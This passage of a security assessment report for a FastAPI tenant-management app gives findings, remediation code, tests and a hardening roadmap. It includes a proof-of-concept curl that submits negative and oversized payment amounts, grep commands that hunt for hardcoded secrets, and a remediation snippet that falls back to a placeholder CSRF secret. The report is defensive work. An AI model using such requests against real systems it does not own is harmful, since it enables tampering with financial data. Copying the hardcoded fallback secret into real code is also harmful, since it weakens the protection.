            record.args = tuple(self.redact_sensitive_data(str(arg)) for arg in record.args)
        return True

    def redact_sensitive_data(self, text: str) -> str:
        for pattern, replacement in self.SENSITIVE_PATTERNS:
            text = pattern.sub(replacement, text)
        return text

# Configure logging
def setup_logging():
    logger = logging.getLogger("kos_database")
    logger.setLevel(logging.INFO)

    handler = logging.StreamHandler()
    handler.addFilter(SensitiveDataFilter())

    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    handler.setFormatter(formatter)

    logger.addHandler(handler)
    return logger

logger = setup_logging()

# backend/routes/auth_router.py
# SAFE logging
logger.info(f"Login attempt for user: {credentials.username}")  # No password
logger.info(f"Token generated for user: {user.username}")  # No token value
logger.info(f"User profile accessed: user_id={user.id}")  # No PII details
```

Create safe model representations:

```python
# backend/models.py
class User(Base):
    __tablename__ = "users"

    # ... fields ...

    def to_log_dict(self) -> dict:
        """Safe representation for logging (no sensitive data)"""
        return {
            "id": self.id,
            "username": self.username,
            "role": self.role,
            "created_at": self.created_at
            # Explicitly exclude: email, hashed_password, etc.
        }

    def __repr__(self):
        return f"<User(id={self.id}, username={self.username}, role={self.role})>"
```

**Test Cases:**

```python
# tests/test_logging_security.py
import logging
from backend.logging_config import SensitiveDataFilter

def test_password_redaction():
    filter = SensitiveDataFilter()

    text = "User login with password: MySecretPass123"
    result = filter.redact_sensitive_data(text)
    assert "MySecretPass123" not in result
    assert "***REDACTED***" in result

def test_token_redaction():
    filter = SensitiveDataFilter()

    text = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    result = filter.redact_sensitive_data(text)
    assert "eyJhbGci" not in result
    assert "***REDACTED***" in result

def test_credit_card_redaction():
    filter = SensitiveDataFilter()

    text = "Payment made with card 4532123456789012"
    result = filter.redact_sensitive_data(text)
    assert "4532123456789012" not in result
    assert "***CARD***" in result
```

---

### MEDIUM SEVERITY

---

#### VULN-008: Missing HTTPS Enforcement

**Severity:** MEDIUM
**OWASP Category:** A02:2021 – Cryptographic Failures
**CWE ID:** CWE-319 (Cleartext Transmission of Sensitive Information)

**Location:** `backend/app.py`

**Description:**

The application doesn't enforce HTTPS, allowing connections over unencrypted HTTP. This exposes:
- Authentication credentials
- Session tokens
- Personal data
- Financial information

**Remediation:**

Add security headers and HTTPS redirect:

```python
# backend/app.py
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
from starlette.middleware.trustedhost import TrustedHostMiddleware

# Force HTTPS in production
if os.getenv("ENVIRONMENT") == "production":
    app.add_middleware(HTTPSRedirectMiddleware)

# Add trusted host middleware
app.add_middleware(
    TrustedHostMiddleware,
    allowed_hosts=["your-app.run.app", "yourdomain.com"]
)

# Security headers middleware
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)

    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"

    return response
```

---

#### VULN-009: No Input Validation on Financial Amounts

**Severity:** MEDIUM
**OWASP Category:** A03:2021 – Injection
**CWE ID:** CWE-20 (Improper Input Validation)

**Location:** `backend/routes/payment_router.py`, `backend/routes/expense_router.py`

**Description:**

Financial endpoints accept amounts without validation, allowing:
- Negative amounts
- Excessively large values
- Non-numeric inputs
- Precision issues

**Proof of Concept:**

```bash
# Create payment with negative amount
curl -X POST https://your-app.run.app/api/payments \
  -H "Content-Type: application/json" \
  -d '{"tenant_id":1,"amount":-1000.00,"date":"2025-01-01"}'
# Could create accounting discrepancies

# Create payment with excessive amount
curl -X POST https://your-app.run.app/api/payments \
  -d '{"tenant_id":1,"amount":999999999999.99,"date":"2025-01-01"}'
# Could overflow database or calculations
```

**Remediation:**

Add validation to schemas:

```python
# backend/schemas.py
from pydantic import BaseModel, validator
from decimal import Decimal
from typing import Optional

class PaymentCreate(BaseModel):
    tenant_id: int
    amount: Decimal
    payment_date: str
    payment_method: Optional[str] = None
    notes: Optional[str] = None

    @validator('amount')
    def validate_amount(cls, amount):
        if amount <= 0:
            raise ValueError("Amount must be greater than 0")

        if amount > Decimal('999999.99'):
            raise ValueError("Amount exceeds maximum allowed value")

        # Check decimal precision (cents only)
        if amount.as_tuple().exponent < -2:
            raise ValueError("Amount cannot have more than 2 decimal places")

        return amount

    @validator('tenant_id')
    def validate_tenant_id(cls, tenant_id):
        if tenant_id <= 0:
            raise ValueError("Invalid tenant ID")
        return tenant_id

class ExpenseCreate(BaseModel):
    amount: Decimal
    category: str
    description: str
    expense_date: str

    @validator('amount')
    def validate_amount(cls, amount):
        if amount <= 0:
            raise ValueError("Amount must be greater than 0")
        if amount > Decimal('999999.99'):
            raise ValueError("Amount exceeds maximum allowed value")
        return amount

    @validator('category')
    def validate_category(cls, category):
        allowed_categories = [
            'maintenance', 'utilities', 'repairs', 'supplies',
            'insurance', 'taxes', 'other'
        ]
        if category.lower() not in allowed_categories:
            raise ValueError(f"Category must be one of: {', '.join(allowed_categories)}")
        return category.lower()
```

Add database constraints:

```python
# backend/models.py
from sqlalchemy import CheckConstraint

class Payment(Base):
    __tablename__ = "payments"

    id = Column(Integer, primary_key=True)
    tenant_id = Column(Integer, ForeignKey("tenants.id"), nullable=False)
    amount = Column(Numeric(10, 2), nullable=False)  # Max 99,999,999.99
    payment_date = Column(Date, nullable=False)

    __table_args__ = (
        CheckConstraint('amount > 0', name='payment_amount_positive'),
        CheckConstraint('amount <= 999999.99', name='payment_amount_max'),
    )

class Expense(Base):
    __tablename__ = "expenses"

    id = Column(Integer, primary_key=True)
    amount = Column(Numeric(10, 2), nullable=False)
    category = Column(String(50), nullable=False)
    expense_date = Column(Date, nullable=False)

    __table_args__ = (
        CheckConstraint('amount > 0', name='expense_amount_positive'),
        CheckConstraint('amount <= 999999.99', name='expense_amount_max'),
    )
```

**Test Cases:**

```python
# tests/test_financial_validation.py

def test_negative_payment_rejected():
    with pytest.raises(ValueError, match="greater than 0"):
        PaymentCreate(tenant_id=1, amount=-100.00, payment_date="2025-01-01")

def test_excessive_payment_rejected():
    with pytest.raises(ValueError, match="exceeds maximum"):
        PaymentCreate(tenant_id=1, amount=9999999.99, payment_date="2025-01-01")

def test_invalid_precision_rejected():
    with pytest.raises(ValueError, match="2 decimal places"):
        PaymentCreate(tenant_id=1, amount=100.999, payment_date="2025-01-01")

def test_valid_payment_accepted():
    payment = PaymentCreate(tenant_id=1, amount=1500.50, payment_date="2025-01-01")
    assert payment.amount == Decimal('1500.50')
```

---

#### VULN-010: Missing CSRF Protection

**Severity:** MEDIUM
**OWASP Category:** A01:2021 – Broken Access Control
**CWE ID:** CWE-352 (Cross-Site Request Forgery)

**Location:** All state-changing endpoints

**Description:**

The API lacks CSRF protection for state-changing operations. Combined with CORS issues, this could allow attackers to make unauthorized requests on behalf of authenticated users.

**Remediation:**

Implement CSRF token protection:

```python
# requirements.txt - add:
# fastapi-csrf-protect==0.3.2

# backend/app.py
from fastapi_csrf_protect import CsrfProtect
from pydantic import BaseModel

class CsrfSettings(BaseModel):
    secret_key: str = os.getenv("CSRF_SECRET_KEY", "your-csrf-secret-key-change-me")
    cookie_name: str = "csrf_token"
    header_name: str = "X-CSRF-Token"
    max_age: int = 3600

@CsrfProtect.load_config
def get_csrf_config():
    return CsrfSettings()

# backend/routes/auth_router.py
from fastapi_csrf_protect import CsrfProtect

@router.post("/login")
async def login(
    credentials: LoginRequest,
    csrf_protect: CsrfProtect = Depends(),
    db: Session = Depends(get_db)
):
    # CSRF token set in response cookie
    # ... login logic ...
    response = JSONResponse(content={"access_token": token})
    csrf_protect.set_csrf_cookie(response)
    return response

@router.post("/users")
async def create_user(
    user: UserCreate,
    csrf_protect: CsrfProtect = Depends(),
    current_user: User = Depends(require_admin),
    db: Session = Depends(get_db)
):
    await csrf_protect.validate_csrf()  # Validates CSRF token
    # ... create user logic ...
```

---

#### VULN-011: No Request Size Limits

**Severity:** MEDIUM
**OWASP Category:** A04:2021 – Insecure Design
**CWE ID:** CWE-770 (Allocation of Resources Without Limits)

**Description:**

Missing request size limits could allow DoS attacks via large payloads.

**Remediation:**

```python
# backend/app.py
from starlette.middleware import Middleware
from starlette.middleware.base import BaseHTTPMiddleware

class RequestSizeLimitMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, max_request_size: int = 10 * 1024 * 1024):  # 10MB default
        super().__init__(app)
        self.max_request_size = max_request_size

    async def dispatch(self, request: Request, call_next):
        content_length = request.headers.get("content-length")

        if content_length and int(content_length) > self.max_request_size:
            return JSONResponse(
                status_code=413,
                content={"detail": "Request entity too large"}
            )

        return await call_next(request)

app.add_middleware(RequestSizeLimitMiddleware, max_request_size=5 * 1024 * 1024)  # 5MB
```

---

#### VULN-012: Insufficient Session Timeout

**Severity:** MEDIUM
**OWASP Category:** A07:2021 – Identification and Authentication Failures

**Description:**

Sessions don't expire, allowing indefinite access with stolen tokens.

**Remediation:**

With JWT implementation (from VULN-001), tokens automatically expire. Add refresh token mechanism:

```python
# backend/security.py
REFRESH_TOKEN_EXPIRE_DAYS = 7

def create_refresh_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    to_encode.update({"exp": expire, "type": "refresh"})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

# backend/routes/auth_router.py
@router.post("/refresh")
async def refresh_token(refresh_token: str, db: Session = Depends(get_db)):
    payload = verify_token(refresh_token)
    if not payload or payload.get("type") != "refresh":
        raise HTTPException(status_code=401, detail="Invalid refresh token")

    username = payload.get("sub")
    user = db.query(User).filter(User.username == username).first()

    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    # Generate new access token
    access_token = create_access_token(data={"sub": user.username, "role": user.role})

    return {"access_token": access_token, "token_type": "bearer"}
```

---

#### VULN-013: Missing Audit Logging

**Severity:** MEDIUM
**OWASP Category:** A09:2021 – Security Logging and Monitoring Failures

**Description:**

No audit trail for sensitive operations (user creation/deletion, financial transactions, role changes).

**Remediation:**

```python
# backend/models.py
class AuditLog(Base):
    __tablename__ = "audit_logs"

    id = Column(Integer, primary_key=True)
    timestamp = Column(DateTime, default=datetime.utcnow, nullable=False)
    user_id = Column(Integer, ForeignKey("users.id"), nullable=False)
    action = Column(String(50), nullable=False)  # CREATE, UPDATE, DELETE, LOGIN, etc.
    resource_type = Column(String(50), nullable=False)  # USER, PAYMENT, TENANT, etc.
    resource_id = Column(Integer, nullable=True)
    details = Column(JSON, nullable=True)
    ip_address = Column(String(45), nullable=True)
    user_agent = Column(String(255), nullable=True)

# backend/security.py
def log_audit_event(
    db: Session,
    user_id: int,
    action: str,
    resource_type: str,
    resource_id: int = None,
    details: dict = None,
    request: Request = None
):
    audit_log = AuditLog(
        user_id=user_id,
        action=action,
        resource_type=resource_type,
        resource_id=resource_id,
        details=details,
        ip_address=request.client.host if request else None,
        user_agent=request.headers.get("user-agent") if request else None
    )
    db.add(audit_log)
    db.commit()

# backend/routes/user_router.py
@router.delete("/{user_id}")
async def delete_user(
    user_id: int,
    request: Request,
    current_user: User = Depends(require_admin),
    db: Session = Depends(get_db)
):
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    # Log before deletion
    log_audit_event(
        db=db,
        user_id=current_user.id,
        action="DELETE",
        resource_type="USER",
        resource_id=user_id,
        details={"deleted_user": user.username},
        request=request
    )

    db.delete(user)
    db.commit()

    return {"message": "User deleted successfully"}
```

---

#### VULN-014: Exposed Error Messages

**Severity:** MEDIUM
**OWASP Category:** A05:2021 – Security Misconfiguration

**Description:**

Detailed error messages may leak sensitive information about database structure, file paths, or system configuration.

**Remediation:**

```python
# backend/app.py
from fastapi.responses import JSONResponse

@app.exception_handler(Exception)
async def generic_exception_handler(request: Request, exc: Exception):
    # Log full error for debugging
    logger.error(f"Unhandled exception: {exc}", exc_info=True)

    # Return generic message to user
    if os.getenv("ENVIRONMENT") == "production":
        return JSONResponse(
            status_code=500,
            content={"detail": "An internal error occurred"}
        )
    else:
        # Show details in development
        return JSONResponse(
            status_code=500,
            content={"detail": str(exc), "type": type(exc).__name__}
        )

@app.exception_handler(SQLAlchemyError)
async def sqlalchemy_exception_handler(request: Request, exc: SQLAlchemyError):
    logger.error(f"Database error: {exc}", exc_info=True)

    return JSONResponse(
        status_code=500,
        content={"detail": "A database error occurred"}
        # Don't reveal: table names, column names, SQL syntax
    )
```

---

#### VULN-015: No Email Validation

**Severity:** MEDIUM
**OWASP Category:** A03:2021 – Injection

**Description:**

Email addresses aren't validated or verified, allowing:
- Invalid email formats
- Disposable emails
- Account creation with fake emails

**Remediation:**

```python
# backend/schemas.py
from pydantic import EmailStr, validator
import re

class UserCreate(BaseModel):
    username: str
    email: EmailStr  # Basic format validation
    password: str

    @validator('email')
    def validate_email(cls, email):
        # Additional validation beyond EmailStr

        # Block disposable email domains
        disposable_domains = [
            'tempmail.com', '10minutemail.com', 'guerrillamail.com',
            'mailinator.com', 'throwaway.email'
        ]

        domain = email.split('@')[1].lower()
        if domain in disposable_domains:
            raise ValueError("Disposable email addresses are not allowed")

        # Ensure reasonable length
        if len(email) > 254:
            raise ValueError("Email address too long")

        return email.lower()  # Normalize to lowercase

# Optional: Add email verification
class User(Base):
    __tablename__ = "users"

    # ... existing fields ...
    email_verified = Column(Boolean, default=False)
    email_verification_token = Column(String, nullable=True)
    email_verification_sent_at = Column(DateTime, nullable=True)
```

---

### LOW SEVERITY

---

#### VULN-016: Missing Security Headers

**Severity:** LOW
**OWASP Category:** A05:2021 – Security Misconfiguration

**Remediation:** See VULN-008 for implementation

---

#### VULN-017: No API Versioning

**Severity:** LOW
**OWASP Category:** A04:2021 – Insecure Design

**Description:**

API lacks versioning, making breaking changes difficult to manage.

**Remediation:**

```python
# backend/app.py
from fastapi import APIRouter

# Version 1 routes
v1_router = APIRouter(prefix="/api/v1")
v1_router.include_router(auth_router, prefix="/auth", tags=["auth"])
v1_router.include_router(user_router, prefix="/users", tags=["users"])
# ... include other routers

app.include_router(v1_router)

# Keep /api/* for backward compatibility (deprecated)
app.include_router(auth_router, prefix="/api/auth", tags=["auth-deprecated"], deprecated=True)
```

---

#### VULN-018: Insufficient Documentation

**Severity:** LOW
**OWASP Category:** A04:2021 – Insecure Design

**Description:**

Missing API documentation makes security review difficult.

**Remediation:**

FastAPI auto-generates documentation. Ensure it's configured properly:

```python
# backend/app.py
app = FastAPI(
    title="KOS Database API",
    description="Room and tenant management system",
    version="1.0.0",
    docs_url="/docs" if os.getenv("ENVIRONMENT") != "production" else None,  # Disable in prod
    redoc_url="/redoc" if os.getenv("ENVIRONMENT") != "production" else None,
    openapi_url="/openapi.json" if os.getenv("ENVIRONMENT") != "production" else None
)
```

---

#### VULN-019: Hardcoded Secrets in Code

**Severity:** LOW (if properly using environment variables) / CRITICAL (if actual secrets found)
**OWASP Category:** A05:2021 – Security Misconfiguration

**Description:**

Check for hardcoded secrets in codebase.

**Remediation:**

```bash
# Scan for potential secrets
grep -r "password.*=.*['\"]" backend/
grep -r "secret.*=.*['\"]" backend/
grep -r "api.*key.*=.*['\"]" backend/

# Ensure all secrets use environment variables
# backend/config.py
import os
from pydantic import BaseSettings

class Settings(BaseSettings):
    database_url: str
    jwt_secret_key: str
    csrf_secret_key: str
    redis_url: str = None
    environment: str = "development"

    class Config:
        env_file = ".env"
        case_sensitive = False

settings = Settings()
```

---

## Compliance Assessment

### GDPR Compliance Gaps

1. **Right to be Forgotten:** No implementation for complete data deletion
2. **Data Portability:** No export functionality for user data
3. **Consent Management:** No consent tracking for data processing
4. **Privacy Policy:** No privacy policy endpoint or documentation
5. **Data Breach Notification:** No incident response procedures

### SOX Compliance Gaps (For Financial Data)

1. **Audit Trail:** Insufficient logging of financial transactions (see VULN-013)
2. **Segregation of Duties:** No approval workflows for financial operations
3. **Data Integrity:** Missing checksums or digital signatures for financial records
4. **Access Controls:** Weak RBAC implementation (see VULN-004)

---

## Prioritized Remediation Roadmap

### Phase 1: Critical Security (Week 1) - IMMEDIATE

**Priority: CRITICAL**

- [ ] **VULN-002:** Fix CORS configuration
- [ ] **VULN-001:** Implement JWT authentication
- [ ] **VULN-003:** Add rate limiting to auth endpoints
- [ ] **VULN-004:** Implement RBAC across all endpoints

**Estimated Effort:** 16-24 hours
**Risk Reduction:** 60%

### Phase 2: High-Priority Fixes (Weeks 2-3)

**Priority: HIGH**

- [ ] **VULN-005:** Implement password strength requirements
- [ ] **VULN-006:** Audit and fix SQL injection vectors
- [ ] **VULN-007:** Implement safe logging practices
- [ ] **VULN-009:** Add financial input validation

**Estimated Effort:** 20-30 hours
**Risk Reduction:** 85% (cumulative)

### Phase 3: Medium-Priority Hardening (Weeks 4-5)

**Priority: MEDIUM**

- [ ] **VULN-008:** Add security headers and HTTPS enforcement
- [ ] **VULN-010:** Implement CSRF protection
- [ ] **VULN-011:** Add request size limits
- [ ] **VULN-012:** Implement session management
- [ ] **VULN-013:** Add comprehensive audit logging
- [ ] **VULN-014:** Improve error handling
- [ ] **VULN-015:** Add email validation

**Estimated Effort:** 24-32 hours
**Risk Reduction:** 95% (cumulative)

### Phase 4: Long-term Security (Week 6+)

**Priority: LOW but RECOMMENDED**

- [ ] **VULN-016:** Add remaining security headers
- [ ] **VULN-017:** Implement API versioning
- [ ] **VULN-018:** Complete documentation
- [ ] **VULN-019:** Secret management audit
- [ ] **Compliance:** GDPR and SOX requirements
- [ ] **Monitoring:** Security event monitoring and alerting
- [ ] **Penetration Testing:** Third-party security assessment

**Estimated Effort:** 30-40 hours
**Risk Reduction:** 98% (cumulative)

---

## Testing & Validation

### Security Test Suite

Create comprehensive test coverage:

```bash
# Create test structure
mkdir -p tests/security
touch tests/security/__init__.py
touch tests/security/test_authentication.py
touch tests/security/test_authorization.py
touch tests/security/test_input_validation.py
touch tests/security/test_injection.py
touch tests/security/test_rate_limiting.py
```

### Automated Security Scanning

Implement CI/CD security checks:

```yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Run Bandit (Python security linter)
        run: |
          pip install bandit
          bandit -r backend/ -f json -o bandit-report.json

      - name: Run Safety (dependency vulnerability check)
        run: |
          pip install safety
          safety check --json

      - name: Run Semgrep (SAST)
        uses: returntocorp/semgrep-action@v1
        with:
          config: p/owasp-top-ten
```

### Manual Testing Checklist

- [ ] Test authentication with invalid credentials
- [ ] Verify RBAC prevents unauthorized access
- [ ] Test rate limiting by exceeding limits
- [ ] Attempt SQL injection on all input fields
- [ ] Test CORS with unauthorized origins
- [ ] Verify password policy enforcement
- [ ] Test with negative/zero/excessive financial amounts
- [ ] Check audit logs for sensitive operations
- [ ] Verify error messages don't leak information
- [ ] Test session timeout and token expiration

---

## Monitoring & Alerting Recommendations

### Security Events to Monitor

1. **Failed Authentication Attempts**
   - Alert on: >5 failures in 5 minutes from single IP
   - Alert on: >20 failures in 1 hour across all IPs

2. **Unauthorized Access Attempts**
   - Alert on: Any 403 Forbidden response
   - Alert on: Attempts to access admin endpoints by non-admins

3. **Unusual Financial Activity**
   - Alert on: Payments >$10,000
   - Alert on: >10 payments in 1 hour
   - Alert on: Any negative amounts attempted

4. **System Anomalies**
   - Alert on: Error rate >1% of requests
   - Alert on: Response time >2 seconds (p95)
   - Alert on: Database connection failures

### Recommended Tools

- **Application Monitoring:** Sentry, DataDog, or New Relic
- **Security Monitoring:** Cloud Security Command Center (GCP)
- **Log Aggregation:** Cloud Logging (GCP) or ELK Stack
- **Uptime Monitoring:** Uptime Robot or Pingdom

---

## Conclusion

### Summary

The KOS Database application has a solid foundation but requires immediate attention to critical security vulnerabilities before production use. The two most urgent issues are:

1. **In-memory token storage** that prevents horizontal scaling
2. **Wide-open CORS configuration** that exposes data to cross-origin attacks

### Risk Level After Remediation

Following the prioritized remediation roadmap:

- **After Phase 1:** Risk reduced to MEDIUM
- **After Phase 2:** Risk reduced to LOW
- **After Phase 3:** Risk reduced to VERY LOW
- **After Phase 4:** Production-ready with enterprise-grade security

### Estimated Total Effort

- **Phase 1 (Critical):** 16-24 hours
- **Phase 2 (High):** 20-30 hours
- **Phase 3 (Medium):** 24-32 hours
- **Phase 4 (Long-term):** 30-40 hours
- **Total:** 90-126 hours (~3-4 weeks for 1 developer)

### Next Steps

1. Review this report with development and security teams
2. Prioritize Phase 1 critical fixes for immediate implementation
3. Set up security testing infrastructure
4. Begin phased remediation following the roadmap
5. Conduct security re-assessment after Phase 2 completion
6. Plan for ongoing security maintenance and monitoring

---

## Appendix A: Quick Reference - Critical Fixes

### Fix #1: CORS Configuration (5 minutes)

```python
# backend/app.py - Line 21
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://your-frontend-domain.com"],  # Change this!
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
)
```

### Fix #2: Environment Variables (10 minutes)

```bash
# Set in GCP Cloud Run
gcloud run services update kos-backend \
  --set-env-vars="JWT_SECRET_KEY=your-random-secret-here" \
  --set-env-vars="ALLOWED_ORIGINS=https://your-frontend.com"
```

### Fix #3: Install Rate Limiting (15 minutes)

```bash
pip install slowapi
```

```python
# Add to backend/app.py
from slowapi import Limiter, _rate_limit_exceeded_handler
limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
```

---

## Appendix B: Security Contacts & Resources

### Reporting Security Issues

- **Internal:** Contact development team lead
- **External:** Set up security@yourdomain.com
- **Bug Bounty:** Consider HackerOne or Bugcrowd platform

### Useful Resources

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [FastAPI Security Best Practices](https://fastapi.tiangolo.com/tutorial/security/)
- [GCP Security Best Practices](https://cloud.google.com/security/best-practices)
- [Python Security Best Practices](https://python.readthedocs.io/en/latest/library/security_warnings.html)

---

**Report Generated:** 2025-11-06
**Next Review Recommended:** After Phase 2 completion or 30 days, whichever comes first
**Assessment Valid Until:** 2025-12-06 (requires re-assessment if major changes made)
